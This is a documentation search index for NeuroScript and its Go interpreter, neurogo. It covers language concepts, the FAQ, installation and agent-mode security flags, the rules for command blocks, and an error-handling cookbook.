(Allowlist/Validate) -&gt; Tool Executor] -&gt; Arrow (TOOL Execution) -&gt; Local Environment Box -&gt; Arrow (Result) -&gt; NeuroGo Agent Box -&gt; Arrow (Function Response) -&gt; LLM Service Box -&gt; Arrow (Final Answer) -&gt; User Box.]</p> <p>(Placeholder for Agent Mode Flow Diagram)</p>"},{"location":"front/concepts/","title":"Core Concepts","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: concepts-v0.1 :: status: draft :: dependsOn: docs/script spec.md, docs/metadata.md, docs/neurodata_and_composite_file_spec.md, pkg/core/tools_register.go, docs/ns/tools/index.md, docs/ns/tools/move_file.md, docs/ns/tools/query_table.md, docs/ns/tools/go_update_imports_for_moved_package.md :: howToUpdate: Review against core project goals and implemented features. Update feature list and links as functionality evolves.  </p>"},{"location":"front/concepts/#core-concepts-features-of-neuroscript","title":"Core Concepts &amp; Features of NeuroScript","text":"<p>This document outlines the fundamental principles driving NeuroScript's design and lists its key features.</p>"},{"location":"front/concepts/#principles","title":"Principles","text":"<p>NeuroScript development adheres to these core principles to ensure it effectively facilitates communication between humans, AI, and computers:</p> <ol> <li> <p>Readability: All users (human, AI, or computer executing parsing logic) must be able to easily read and understand the intent of NeuroScript files (<code>.ns.txt</code>) and NeuroData (<code>.nd*</code>) formats. Simple edits should ideally be possible without constantly referring to documentation. NS formats prioritize being self-describing.     [Diagram Suggestion: Simple icons representing Human, AI, Computer all looking at a readable text document.]</p> </li> <li> <p>Executability: The procedural steps defined in NeuroScript should be clear enough that any participant could, in principle, follow the logic and perform the actions described, whether manually or through automated interpretation. This supports auditing and understanding workflow.</p> </li> <li> <p>Clarity: The primary focus is always on clear communication. Features, syntax, and data structures favor explicitness and obviousness over achieving maximum concision or supporting highly complex, obscure constructs. The \"mile wide, inch deep\" philosophy applies here.</p> </li> <li> <p>Embedded Metadata: Wherever practical, NeuroScript files should contain standard metadata (<code>:: key: value</code>) indicating their version, dependencies, and potentially instructions for maintenance. This promotes better organization and understanding of interrelationships within a project. See the Metadata Specification.</p> </li> </ol>"},{"location":"front/concepts/#key-features","title":"Key Features","text":"<p>NeuroScript achieves its goals through the following key features:</p> <p>[Diagram Suggestion: High-level block diagram showing 'neurogo' interacting with '.ns.txt Scripts (Skills)', '.nd* NeuroData', 'External TOOLs (Go Code)', and 'LLM API'.]</p> <ul> <li>Structured Pseudocode for AI/Human/Computer: Provides a way to write procedures (<code>DEFINE PROCEDURE</code>) that combine simple, imperative steps (like <code>SET</code>, <code>EMIT</code>, <code>RETURN</code>) with loops (<code>FOR EACH</code>, <code>WHILE</code>), conditions (<code>IF/THEN/ELSE</code>), and calls to more complex logic (other procedures, tools, LLMs). See the Language Specification.</li> <li>Explicit Reasoning Flow: Moves complex workflows out of ambiguous natural language or hidden model \"thoughts\" into a reviewable, step-by-step script format.</li> <li>Self-Documenting Procedures: The mandatory <code>COMMENT:</code> block within each procedure requires defining <code>PURPOSE</code>, <code>INPUTS</code>, <code>OUTPUT</code>, and <code>ALGORITHM</code>, ensuring that the \"skill\" captured is understandable and reusable. See the Language Specification.</li> <li>Tool Integration: A core concept is extending capabilities via <code>CALL TOOL.FunctionName(...)</code>. This integrates external Go functions for specific tasks. Numerous tools are built-in, covering areas like Filesystem (e.g., TOOL.MoveFile spec), Git, String manipulation, Shell execution (use with caution!), Go build/test (e.g., TOOL.GoUpdateImports spec), Vector DB operations (Mock), Metadata Extraction, NeuroData Checklist Parsing, NeuroData Block Extraction, NeuroData Table Querying (TOOL.QueryTable spec), Math operations, List operations, and more. See the Tool Specification Index for available detailed specs or tools_register.go for the source list.</li> <li>LLM Integration: <code>CALL LLM(prompt)</code> provides a straightforward way to delegate tasks suited to Large Language Models, like text generation, summarization, or complex analysis. See llm.go.</li> <li>Rich Data Handling: Supports basic literals (string, number, boolean) and composite types like lists (<code>[...]</code>) and maps (<code>{...}</code>) directly in the syntax, including element access (<code>list[index]</code>, <code>map[\"key\"]</code>). See Language Specification.</li> <li>Basic Control Flow: Standard <code>IF/THEN/ELSE/ENDBLOCK</code>, <code>WHILE/DO/ENDBLOCK</code>, and <code>FOR EACH/IN/DO/ENDBLOCK</code> constructs allow for essential procedural logic. <code>FOR EACH</code> supports iteration over lists, map keys, and string characters. See interpreter_control_flow.go.</li> <li>CLI Interpreter (<code>neurogo</code>): The reference implementation (<code>neurogo</code>) is a command-line tool written in Go that parses and executes <code>.ns.txt</code> files. It supports loading libraries of procedures, debug flags, and different execution modes. See Installation &amp; Setup and neurogo source.</li> <li>Agent Mode (Experimental): <code>neurogo</code> can operate as a secure backend agent, allowing an external LLM (like Gemini) to request the execution of allowlisted <code>TOOL.*</code> functions via its Function Calling API. This enables AI-driven interaction with the local environment under strict security controls. See the Agent Facilities Design.     [Diagram Suggestion: Flowchart illustrating Agent Mode: User -&gt; LLM -&gt; NeuroGo Agent (Security Layer -&gt; Tool Executor) -&gt; Local Env -&gt; NeuroGo Agent -&gt; LLM -&gt; User.]</li> <li>VS Code Extension: Basic syntax highlighting support for <code>.ns.txt</code> files is available to improve the editing experience (vscode-neuroscript).</li> <li>NeuroData Parsing: Built-in tools facilitate working with specific NeuroData formats like Checklists (<code>.ndcl</code>) and extracting data from composite files using fenced blocks. See NeuroData tools.</li> </ul>"},{"location":"front/contributing/","title":"Contributing","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: contributing-v0.1 :: status: draft :: dependsOn: docs/RoadMap.md, docs/development checklist.md, LICENSE, docs/front/installation.md :: howToUpdate: Update contribution process details when the project is ready to accept external contributions. Keep links to roadmap/checklist current.  </p>"},{"location":"front/contributing/#contributing-to-neuroscript","title":"Contributing to NeuroScript","text":""},{"location":"front/contributing/#current-status-planning-early-development","title":"Current Status: Planning &amp; Early Development","text":"<p>Thank you for your interest in contributing to NeuroScript!</p> <p>We are excited about building a community around this project. However, NeuroScript is currently in a very early and rapidly evolving stage of development. As noted in the main README.md, major components are undergoing constant updates, and the core APIs and formats are not yet stable.</p> <p>Therefore, we are not formally accepting external contributions (like Pull Requests) at this exact moment. (\"NOT YET :P\")</p> <p>This allows the core team (currently Andrew Price and AI collaborators like myself) to establish the foundational architecture and stabilize the key specifications without introducing excessive coordination overhead too early.</p>"},{"location":"front/contributing/#how-to-contribute-in-the-future","title":"How to Contribute (In the Future)","text":"<p>Once the project reaches a more stable phase (likely post-v0.1 or as indicated in the Roadmap), we plan to welcome contributions via the standard GitHub workflow:</p> <ol> <li>Discussions &amp; Issues: Please start by opening a GitHub Issue to discuss potential bugs, feature ideas, or proposed changes before submitting code.</li> <li>Pull Requests: Submit Pull Requests against the <code>main</code> branch (or a designated development branch) with clear descriptions of your changes.</li> </ol>"},{"location":"front/contributing/#areas-for-contribution-ideas","title":"Areas for Contribution Ideas","text":"<p>When we are ready for contributions, good places to look for ideas or tasks include:</p> <ul> <li>Roadmap: The high-level docs/RoadMap.md outlines major planned features and development phases.</li> <li>Development Checklist: The more granular docs/development checklist.md tracks specific planned features, tasks, and known issues.</li> <li>Tooling: Implementing new <code>TOOL.*</code> functions (especially integrations with external services or libraries).</li> <li>NeuroData Formats: Designing specifications for new data formats or implementing parsers/tools for existing ones (docs/NeuroData/).</li> <li>Interpreter Enhancements: Improving error handling, performance, or adding advanced language features.</li> <li>Documentation: Writing more examples, tutorials, or refining existing specifications for clarity.</li> <li>Testing: Increasing unit and integration test coverage.</li> <li>VS Code Extension: Enhancing the extension with features beyond basic syntax highlighting.</li> </ul>"},{"location":"front/contributing/#development-setup","title":"Development Setup","text":"<ul> <li>The core <code>neurogo</code> interpreter is written in Go. See the Installation &amp; Setup guide for prerequisites (Go version, Git).</li> <li>Please adhere to standard Go formatting (<code>gofmt</code>).</li> <li>Follow the project's core Principles (Readability, Clarity, etc.) in any code or documentation contributions.</li> </ul>"},{"location":"front/contributing/#license","title":"License","text":"<p>By contributing, you agree that your contributions will be licensed under the project's MIT License (see LICENSE file).</p> <p>We appreciate your understanding and look forward to collaborating with the community in the future!</p>"},{"location":"front/faq/","title":"FAQ","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: faq-v0.1 :: status: draft :: dependsOn: docs/front/concepts.md, docs/script spec.md, docs/neurodata_and_composite_file_spec.md, docs/metadata.md, pkg/core/tools_register.go :: howToUpdate: Add new questions as they arise, update answers based on project changes, ensure links remain valid.  </p>"},{"location":"front/faq/#frequently-asked-questions-faq","title":"Frequently Asked Questions (FAQ)","text":""},{"location":"front/faq/#general-what-is-neuroscript","title":"General / What is NeuroScript?","text":"<p>Q: What problem does NeuroScript aim to solve? A: NeuroScript tackles the communication friction inherent in complex systems where humans, AI agents (like LLMs), and traditional computer programs need to collaborate. It aims to provide clearer, more reliable, and repeatable ways to exchange procedural knowledge (\"skills\") and structured data than using natural language or complex code interfaces alone. See Why NeuroScript? for more motivation.</p> <p>Q: Who is NeuroScript for? A: It's designed for developers building hybrid systems, AI engineers creating agentic workflows, technical teams needing clear process documentation, and potentially anyone looking for a structured way to define and share procedures that can be understood and executed by different types of actors (human, AI, computer).</p> <p>Q: What are the core principles? A: Readability, Executability, Clarity, and Embedded Metadata. The goal is formats that are self-describing, auditable, and prioritize clarity over concision. See Principles.</p> <p>Q: Is NeuroScript production-ready? A: No. As stated clearly in the main README.md, NeuroScript is in EARLY DEVELOPMENT and undergoing massive, constant updates. It should not be used in production environments at this stage.</p>"},{"location":"front/faq/#neuroscript-language-nstxt","title":"NeuroScript Language (<code>.ns.txt</code>)","text":"<p>Q: Is NeuroScript a full programming language? A: It\u2019s more of a structured pseudocode or orchestration language. It's focused on providing procedural scaffolding, managing state (<code>SET</code>), and coordinating calls to external logic (LLMs via <code>CALL LLM</code>, external tools via <code>CALL TOOL.*</code>, other NeuroScript Procedures via <code>CALL ProcedureName</code>). Complex computation is typically delegated to tools or LLMs. See the Language Specification.</p> <p>Q: What's the <code>COMMENT:</code> block for? Why is it mandatory? A: The <code>COMMENT:</code> block serves as a structured docstring for each <code>DEFINE PROCEDURE</code>. It's mandatory to enforce the principle of self-documenting skills. It includes standardized sections like <code>PURPOSE</code>, <code>INPUTS</code>, <code>OUTPUT</code>, <code>ALGORITHM</code>, <code>LANG_VERSION</code>, <code>CAVEATS</code>, and <code>EXAMPLES</code>, making procedures understandable and discoverable by both humans and AI. See the Language Specification.</p> <p>Q: How does variable substitution work? What's <code>EVAL()</code> for? A: NeuroScript uses explicit evaluation for placeholders. Standard expressions (like in <code>SET variable = \"Hello \" + name</code> or <code>EMIT message</code>) evaluate variables/literals directly to their raw values. Placeholders like <code>{{variable}}</code> or <code>{{LAST}}</code> are only substituted when processed by the <code>EVAL(string_expression)</code> function. <code>EVAL</code> first evaluates its argument to get a string, then scans that string for placeholders and replaces them with current variable values. See Core Concepts in concepts.md and the Language Specification.</p> <p>Q: What does <code>LAST</code> do? A: The <code>LAST</code> keyword evaluates to the raw value returned by the most recently executed <code>CALL</code> statement (whether calling another procedure, <code>LLM</code>, or a <code>TOOL.*</code>). See the Language Specification.</p> <p>Q: How are NeuroScript procedures/skills stored and found? A: Procedures are defined in <code>.ns.txt</code> files. These files are intended to be stored in a library structure (e.g., a directory specified via the <code>-lib</code> flag in <code>neurogo</code>, potentially managed by Git). Discovery is planned via tools like <code>TOOL.SearchSkills</code> (currently mocked) which would likely use vector embeddings generated from the procedure docstrings.</p> <p>Q: How does versioning work? A: There are two main levels:     * File Content Version: Use <code>:: version: &lt;semver&gt;</code> metadata at the top of any file (<code>.ns.txt</code>, <code>.nd*</code>, <code>.md</code>, etc.) to track changes to that specific file's content. See Metadata Specification. The older <code>FILE_VERSION \"...\"</code> directive in <code>.ns.txt</code> is supported but deprecated in favor of <code>:: version:</code>.     * Language Compatibility: Use <code>LANG_VERSION: &lt;semver&gt;</code> inside a procedure's <code>COMMENT:</code> block to indicate which version of the NeuroScript language specification the procedure targets. See the Language Specification.</p>"},{"location":"front/faq/#neurodata-formats-nd","title":"NeuroData Formats (<code>.nd*</code>)","text":"<p>Q: What is NeuroData? A: NeuroData is a collection of simple, plain-text, human-readable formats designed for representing structured data like checklists (<code>.ndcl</code>), tables (<code>.ndtable</code>), graphs (<code>.ndgraph</code>), trees (<code>.ndtree</code>), schemas (<code>.ndmap_schema</code>), forms (<code>.ndform</code>), etc., within the NeuroScript ecosystem. See the NeuroData Overview.</p> <p>Q: What is a \"composite file\"? A: A file (typically Markdown <code>.md</code>) that contains multiple fenced code/data blocks, potentially including NeuroScript code, NeuroData formats, or other language snippets, interspersed with explanatory text. NeuroScript provides tools (<code>TOOL.BlocksExtractAll</code>) for parsing these files and extracting the structured blocks based on their fence tags and <code>:: id:</code> metadata. See the NeuroData Overview.</p> <p>Q: How do references like <code>[ref:...]</code> work? A: They provide a standard way to link to other resources (files or specific blocks within files) within the project. The syntax is <code>[ref:&lt;location&gt;]</code> for files or <code>[ref:&lt;location&gt;#&lt;block_id&gt;]</code> for blocks, where <code>&lt;location&gt;</code> is usually <code>this</code> or a relative path (using <code>/</code>). Tools resolving these references must use security mechanisms like <code>SecureFilePath</code>. See the References Specification.</p>"},{"location":"front/faq/#neurogo-interpreteragent","title":"<code>neurogo</code> Interpreter/Agent","text":"<p>Q: How do I run a NeuroScript procedure? A: Use the <code>neurogo</code> command-line tool. Specify the library path (<code>-lib</code>), the file containing the procedure, and the procedure name, followed by any arguments. Example: <code>./neurogo -lib ./library ./library/ask_llm.ns.txt AskCapitalCity \"Canada\"</code>. See Installation &amp; Setup.</p> <p>Q: What are the debug flags? A: <code>-debug-ast</code> prints the Abstract Syntax Tree after parsing. <code>-debug-interpreter</code> provides step-by-step logging of the interpreter's execution flow. See Installation &amp; Setup.</p> <p>Q: What is Agent Mode (<code>-agent</code>)? A: An experimental mode where <code>neurogo</code> acts as a secure backend for an LLM (like Gemini). Instead of executing a script directly, it listens for function call requests from the LLM, validates them against allow/deny lists and security rules, executes permitted <code>TOOL.*</code> functions within a sandbox, and returns the results to the LLM. See the Agent Facilities Design and Installation &amp; Setup.</p>"},{"location":"front/faq/#tools-tool","title":"Tools (<code>TOOL.*</code>)","text":"<p>Q: Can I integrate external tools besides LLMs? A: Yes\u2014this is a core feature. You can define Go functions and register them using the <code>ToolRegistry</code> (<code>pkg/core/tools_register.go</code>). They become available via <code>CALL TOOL.YourFunctionName(...)</code>. Numerous filesystem, string, Git, Go, NeuroData, and Metadata tools are already included.</p> <p>Q: Is <code>TOOL.ExecuteCommand</code> safe? A: Potentially dangerous. Executing arbitrary shell commands carries inherent security risks. While <code>neurogo</code> provides some basic safeguards (like attempting path validation if arguments look like paths), it's highly recommended to disable <code>TOOL.ExecuteCommand</code> completely when running in Agent Mode or executing untrusted scripts, using the <code>-denylist</code> flag or similar security configurations. See the Agent Facilities Design.</p> <p>Q: What is <code>SecureFilePath</code>? A: It's a security mechanism used internally by filesystem-related tools (<code>TOOL.ReadFile</code>, <code>TOOL.WriteFile</code>, <code>TOOL.ListDirectory</code>, etc.). When <code>neurogo</code> is run with a sandbox directory (<code>-sandbox</code>), <code>SecureFilePath</code> ensures that any file paths manipulated by tools resolve safely within that designated directory, preventing access to files outside the sandbox (e.g., via <code>../</code> traversal). This is crucial for agent security. See <code>pkg/core/security.go</code> and related tool implementations.</p>"},{"location":"front/faq/#contributing-future","title":"Contributing / Future","text":"<p>Q: How do I version-control procedures? A: Store <code>.ns.txt</code> files (and related <code>.nd*</code> files) in a Git repository. Use <code>TOOL.GitAdd</code> and <code>TOOL.GitCommit</code> (or external Git commands) to manage changes. Use <code>:: version:</code> metadata in files and <code>LANG_VERSION:</code> in procedure docstrings to track content versions.</p> <p>Q: How can I contribute? A: Contributions are planned but the project is currently in very early, rapid development (\"NOT YET :P\"). When open, contributions will likely involve adding tools, NeuroData formats, enhancing the interpreter, improving documentation, or adding tests. See Contributing, the Roadmap, and the Development Checklist for potential areas.</p>"},{"location":"front/installation/","title":"Installation","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: installation-v0.1 :: status: draft :: dependsOn: cmd/neurogo/main.go, pkg/neurogo/config.go, docs/build.md :: howToUpdate: Update Go version, build steps, or CLI flags/examples as the project evolves.  </p>"},{"location":"front/installation/#installation-setup-neurogo-cli","title":"Installation &amp; Setup (<code>neurogo</code> CLI)","text":"<p>STATUS: EARLY DEVELOPMENT</p> <p>Under massive and constant updates, do not use yet. This guide provides instructions for building and running the <code>neurogo</code> command-line tool from source.</p>"},{"location":"front/installation/#1-prerequisites","title":"1. Prerequisites","text":"<ul> <li>Go Environment: You need a working Go installation. Version 1.21 or later is recommended.</li> <li>Git: The Git command-line tool is required for version control interaction (used by some <code>TOOL.Git*</code> functions) and potentially for fetching dependencies.</li> <li>(Optional) Java &amp; ANTLR: If you need to regenerate the NeuroScript parser code from the <code>.g4</code> grammar file (<code>pkg/core/NeuroScript.g4</code>), you will need Java and the ANTLR tool itself. However, the generated Go parser files are included in the repository, so ANTLR is NOT required just to build and run <code>neurogo</code>. See docs/build.md for parser generation details.</li> </ul>"},{"location":"front/installation/#2-building-neurogo","title":"2. Building <code>neurogo</code>","text":"<ol> <li>Clone/Download Source: Obtain the <code>neuroscript</code> project source code (e.g., via <code>git clone</code>).</li> <li>Navigate to Root: Open your terminal and change directory to the project's root folder (the one containing <code>go.mod</code>).</li> <li>Build: Run the standard Go build command:     <pre><code>go build -o neurogo ./cmd/neurogo\n</code></pre></li> <li>Result: This command compiles the code and creates the <code>neurogo</code> executable file in the current directory (the project root). Go will automatically handle downloading necessary dependencies defined in <code>go.mod</code>.</li> </ol>"},{"location":"front/installation/#3-configuration","title":"3. Configuration","text":""},{"location":"front/installation/#llm-connection-optional","title":"LLM Connection (Optional)","text":"<ul> <li>If you plan to use NeuroScript features that interact with Large Language Models (<code>CALL LLM</code>), you need to provide API credentials.</li> <li>Primary Method (Recommended): Set the <code>GEMINI_API_KEY</code> environment variable:     <pre><code>export GEMINI_API_KEY=\"YOUR_API_KEY_HERE\"\n</code></pre></li> <li>Alternative Method: Use the <code>-apikey</code> command-line flag when running <code>neurogo</code>:     <pre><code>./neurogo -apikey \"YOUR_API_KEY_HERE\" ...\n</code></pre></li> <li>Default Model: The system currently defaults to using Google's <code>gemini-1.5-pro-latest</code> model.</li> <li>Changing Model (Agent Mode): When running in Agent mode, you can specify a different Gemini model using the <code>-model</code> flag:     <pre><code>./neurogo -agent -model models/gemini-1.5-flash-latest ...\n</code></pre></li> </ul>"},{"location":"front/installation/#4-running-neurogo-script-execution-mode","title":"4. Running <code>neurogo</code> (Script Execution Mode)","text":"<p>This is the primary mode for executing <code>.ns.txt</code> scripts directly.</p> <ul> <li>Basic Syntax: <pre><code>./neurogo [flags] &lt;Target&gt; [ProcedureArguments...]\n</code></pre></li> <li><code>&lt;Target&gt;</code>: Can be either:<ul> <li>The path to a <code>.ns.txt</code> file (e.g., <code>./library/examples/example.ns.txt</code>). <code>neurogo</code> will execute the first procedure defined in that file.</li> <li>The name of a specific procedure (e.g., <code>TestListAndMapAccess</code>). <code>neurogo</code> will search for this procedure in files within the library path(s).</li> </ul> </li> <li><code>[ProcedureArguments...]</code>: Any arguments to pass to the NeuroScript procedure being run, provided as separate strings.</li> <li>Common Flags:<ul> <li><code>-lib &lt;path&gt;</code>: Specifies a directory containing <code>.ns.txt</code> files to be treated as a library. Can be used multiple times. Procedures in library files can be called by <code>&lt;Target&gt;</code> name. Example: <code>-lib ./library</code>.</li> <li><code>-debug-ast</code>: Prints the Abstract Syntax Tree after parsing the script.</li> <li><code>-debug-interpreter</code>: Enables verbose logging of the interpreter's execution steps.</li> </ul> </li> <li>Examples: <pre><code># Run the first procedure in examples/example.ns.txt, using ./library for CALLs\n./neurogo -lib ./library ./library/examples/example.ns.txt\n\n# Run the specific procedure 'AskCapitalCity' found in the library, with debug output\n./neurogo -debug-interpreter -lib ./library AskCapitalCity \"France\"\n\n# Run a procedure from a specific file, passing arguments\n./neurogo -lib ./library ./library/test_listmap.ns.txt TestListAndMapAccess \"MyPrefix\" \"Arg2Value\"\n</code></pre></li> </ul>"},{"location":"front/installation/#5-running-neurogo-agent-mode-experimental","title":"5. Running <code>neurogo</code> (Agent Mode - Experimental)","text":"<p>This mode allows <code>neurogo</code> to act as a secure backend for an LLM.</p> <ul> <li>Basic Syntax: <pre><code>./neurogo -agent [security_flags...] [other_flags...]\n</code></pre></li> <li>Required Security Flags:<ul> <li><code>-agent</code>: Enables agent mode.</li> <li><code>-allowlist &lt;file&gt;</code>: Path to a text file listing <code>TOOL.FunctionName</code>s the LLM is allowed to call (one per line).</li> <li><code>-sandbox &lt;dir&gt;</code>: Path to a directory that acts as the root for all filesystem operations requested by the LLM via tools. Crucial for security.</li> </ul> </li> <li>Optional Security Flags:<ul> <li><code>-denylist &lt;file&gt;</code>: Path to a text file listing <code>TOOL.FunctionName</code>s the LLM is explicitly forbidden from calling (overrides allowlist). Recommended for disabling dangerous tools like <code>TOOL.ExecuteCommand</code>.</li> </ul> </li> <li>Other Agent Flags:<ul> <li><code>-model &lt;model_name&gt;</code>: Specify which Gemini model to use (e.g., <code>models/gemini-1.5-flash-latest</code>).</li> <li><code>-apikey &lt;key&gt;</code>: Provide API key via flag (alternative to environment variable).</li> </ul> </li> <li>Example: <pre><code># Start agent mode, requiring GEMINI_API_KEY env var\n# Allow tools listed in agent_allowlist.txt\n# Confine file operations to ./agent_sandbox directory\n./neurogo -agent \\\n    -allowlist ./cmd/neurogo/agent_allowlist.txt \\\n    -sandbox ./cmd/neurogo/agent_sandbox \\\n    -denylist ./cmd/neurogo/agent_denylist.txt # Optional: Explicitly deny certain tools\n</code></pre></li> </ul>"},{"location":"front/installation/#6-optional-setup-vector-database","title":"6. Optional Setup (Vector Database)","text":"<ul> <li>The tools related to finding NeuroScript skills (<code>TOOL.SearchSkills</code>, <code>TOOL.VectorUpdate</code>) currently use a simple in-memory mock implementation.</li> <li>No external vector database setup is required to use the current version of <code>neurogo</code>. A real implementation is planned for the future.</li> </ul>"},{"location":"front/why-ns/","title":"Why NeuroScript","text":"<p>:: type: NSproject :: subtype: documentation :: version: 0.1.0 :: id: why-neuroscript-v0.1 :: status: draft :: dependsOn: docs/front/architecture.md, docs/front/concepts.md, docs/script spec.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Review against the project's evolving goals and capabilities. Ensure links remain valid.  </p>"},{"location":"front/why-ns/#why-neuroscript","title":"Why NeuroScript?","text":"<p>\"A mile wide and an inch deep\": NS contains many formats, all are simple, not concise, not optimized. This is by design -- everything should be as obvious and self-explanatory as possible.</p> <p>NeuroScript exists to enable more effective collaboration in increasingly complex systems involving people, AI models, and traditional software components. Here's why it's a valuable approach:</p> <ol> <li> <p>Build More Robust Hybrid Systems: By providing clear, structured communication channels (Core Components in architecture.md), NeuroScript reduces ambiguity and errors inherent in purely natural language instructions or overly complex code interfaces. This clarity simplifies the design and implementation of sophisticated systems where AI, code, and humans must work together reliably.</p> </li> <li> <p>Enable Effective Specialization: Leverage the unique strengths of each participant. Let computers handle repetitive, mechanical tasks at high speed using deterministic <code>TOOL.*</code> functions (see Key Features in concepts.md). Allow AI agents (<code>CALL LLM</code>) to perform complex pattern recognition, generation, and inferential work. Keep humans in the loop for direction, review, and tasks requiring nuanced judgment (see Agent Mode in concepts.md). NeuroScript acts as the orchestrator.</p> </li> <li> <p>Allow Clear Oversight &amp; Auditing: All NeuroScript procedures (<code>.ns.txt</code>) and data formats (<code>.nd*</code>) are plain text, designed explicitly for readability by all parties (Principle #1 in concepts.md). This transparency makes it easier to understand, debug, review, and audit the behavior of complex workflows, unlike opaque model internals or complex compiled code.</p> </li> <li> <p>Improve Efficiency (Compute &amp; Energy): Procedural knowledge captured in NeuroScript allows simpler or less computationally intensive AI models (or even non-AI components) to perform tasks that might otherwise require a larger, more energy-hungry model. By encoding reusable \"skills\" and leveraging specialized tools, systems can potentially achieve complex results more efficiently (see Agent Facilities Design).</p> </li> <li> <p>Increase Reliability &amp; Repeatability: Explicit procedural knowledge in <code>.ns.txt</code> files (Language Specification in ../script spec.md) ensures tasks are performed consistently. Standardized NeuroData formats (NeuroData Overview in ../neurodata_and_composite_file_spec.md) ensure data is represented uniformly, reducing errors caused by inconsistent inputs or outputs between different system components.</p> </li> </ol>"},{"location":"ns/command_block_rules/","title":"Rules for Command Blocks","text":"<p>Of course. It's wise to review the design rules before diving into the implementation. Here is the summary of the rules for command blocks that we've established.</p> <p>Command Block Rules A command block is a top-level construct in NeuroScript designed for imperative, one-off execution of tasks. It is explicitly separated from the library-style func and on definitions to ensure safety and clarity.</p> <p>Strict Separation: A script file may contain command blocks or func/on definitions, but never both. This is a syntax-level rule enforced by the parser.</p> <p>No Return Value: command blocks do not produce a return value. The return keyword is a syntax error inside a command block. A command either completes successfully or it fails, raising an error.</p> <p>No Event Handlers: command blocks cannot contain on event handlers. They are for synchronous execution, not for long-lived, event-driven behavior.</p> <p>Error Handling: on error blocks are permitted inside a command and are scoped to that command block.</p> <p>No Function Definitions: command blocks cannot define new functions (func).</p> <p>Can Call Functions: They are allowed to call pre-existing functions that have been defined in other library scripts.</p> <p>Sequential Execution: If a script contains multiple command blocks, they are executed in the order they appear in the file.</p> <p>Non-Empty: A command block (as well as func, if, while, for, on error, and on event blocks) must contain at least one valid statement. A block containing only comments or whitespace is a syntax error.</p>"},{"location":"ns/errors_guide/","title":"NeuroScript / FDM \u2014 Error-Handling Cookbook","text":"<p>This guide shows when and how to create, propagate, and classify errors across the entire code-base.  It is aligned with the actual Go code you have today:</p> <ul> <li><code>pkg/lang/errors.go</code>          \u2013 type <code>RuntimeError</code>, enum <code>ErrorCode</code></li> <li><code>pkg/lang/error_gate.go</code>      \u2013 central \u201ccritical\u201d filter (<code>lang.Check</code>)</li> </ul>"},{"location":"ns/errors_guide/#tldr","title":"TL;DR","text":"<p>Quick Guide: Adding <code>lang.Check</code> to Existing Files To integrate a file with the central error gate, you only need to modify the standard Go error check. The goal is to ensure every error that gets returned \"bubbles up\" through </p> <pre><code>lang.Check.\n</code></pre> <p>The pattern is a simple, one-line change.</p>"},{"location":"ns/errors_guide/#before","title":"Before","text":"<p>Your original code will look something like this:</p> <p>Go <pre><code>value, err := someFunction()\nif err != nil {\n    return nil, err\n}\n</code></pre></p>"},{"location":"ns/errors_guide/#after","title":"After","text":"<p>Wrap the err variable with lang.Check inside the if statement. The := shadows the original err variable, which is standard Go practice.</p> <p>Go <pre><code>value, err := someFunction()\nif err := lang.Check(err); err != nil {\n    return nil, err\n}\n</code></pre></p> <p>This simple change ensures that every potential error is inspected by the central handler, which will automatically panic on critical errors or pass non-critical ones through. </p>"},{"location":"ns/errors_guide/#1-canonical-error-type-helpers","title":"1  Canonical error type &amp; helpers","text":"<pre><code>// errors.go  (already exists)\ntype ErrorCode int\n\nconst (\n    ErrorCodeGeneric ErrorCode = iota\n    // ... many other codes\n    ErrorCodeSecurity\n    ErrorCodeAttackProbable\n    ErrorCodeAttackCertain\n    ErrorCodeSubsystemCompromised\n    ErrorCodeInternal\n)\n\ntype RuntimeError struct {\n    Code     ErrorCode\n    Message  string // updated from Msg\n    Wrapped  error  // updated from Err\n    Position *Position\n}\n\nfunc NewRuntimeError(code ErrorCode, message string, wrapped error) *RuntimeError // updated signature\n</code></pre>"},{"location":"ns/errors_guide/#2-critical-vs-non-critical-mapping","title":"2  Critical-vs-non-critical mapping","text":"<code>ErrorCode</code> Critical? Typical source <code>ErrorCodeSyntax</code> no Parser / AST builder <code>ErrorCodeEvaluation</code> no Interpreter step <code>ErrorCodeResourceExhaustion</code> no* Quota exhausted \u2192 Script stop <code>ErrorCodeSecurity</code> YES Path escape, ACL break <code>ErrorCodeAttackProbable</code> / <code>Certain</code> YES Heuristic agent <code>ErrorCodeSubsystemCompromised</code> YES Integrity checker <code>ErrorCodeSubsystemQuarantined</code> YES Security agent <code>ErrorCodeInternal</code> YES Logic bug, invariant break <p><code>ResourceExhaustion</code> becomes critical only if the system fails to throttle; normally scripts just receive an error and stop.</p> <p>Critical codes are listed in <code>error_gate.go::criticalCodes</code> and trigger the global handler.</p>"},{"location":"ns/errors_guide/#3-the-one-helper-every-layer-calls","title":"3  The one helper every layer calls","text":"<pre><code>err := doSomething()\nif err := lang.Check(err); err != nil {\n    return nil, err   // bubble up\n}\n</code></pre> <p>Behaviour of <code>lang.Check</code> (error_gate.go):</p> <ol> <li>nil \u2192 returns nil. </li> <li>RuntimeError    * critical   \u2192 increments metric <code>lang.CriticalCount</code> and invokes      <code>lang.CriticalHandler</code> (default is <code>panic</code>).</li> <li>non-critical \u2192 passes straight through.</li> <li>plain error (not <code>RuntimeError</code>)    \u2192 automatically wrapped with <code>ErrorCodeInternal</code>, counted as critical.</li> </ol> <p>Keep code\u2010paths clean: do not log or panic locally; rely on <code>Check</code>.</p>"},{"location":"ns/errors_guide/#4-overriding-the-critical-handler-engine-init","title":"4  Overriding the critical handler (engine init)","text":"<pre><code>func init() {\n    lang.RegisterCriticalHandler(func(e *lang.RuntimeError) {\n        slog.Error(\"critical\", \"code\", e.Code, \"msg\", e.Message)\n        metrics.Inc(\"critical_total\")\n        os.Exit(1)   // or supervisor restart\n    })\n}\n</code></pre>"},{"location":"ns/errors_guide/#5-convenience-helpers","title":"5  Convenience helpers","text":"<ul> <li><code>lang.IsCritical(err)</code> \u2013 true if the wrapped code is critical.</li> <li><code>lang.Must(v, err)</code> \u2013 panic via <code>Check</code> if critical, else return v.</li> </ul> <pre><code>fd := lang.Must(os.Open(path))\n</code></pre>"},{"location":"ns/errors_guide/#6-checklist-for-contributors","title":"6  Checklist for contributors","text":"<ul> <li>[ ] Construct only <code>*lang.RuntimeError</code> in production paths.</li> <li>[ ] Call <code>lang.Check(err)</code> exactly once per return 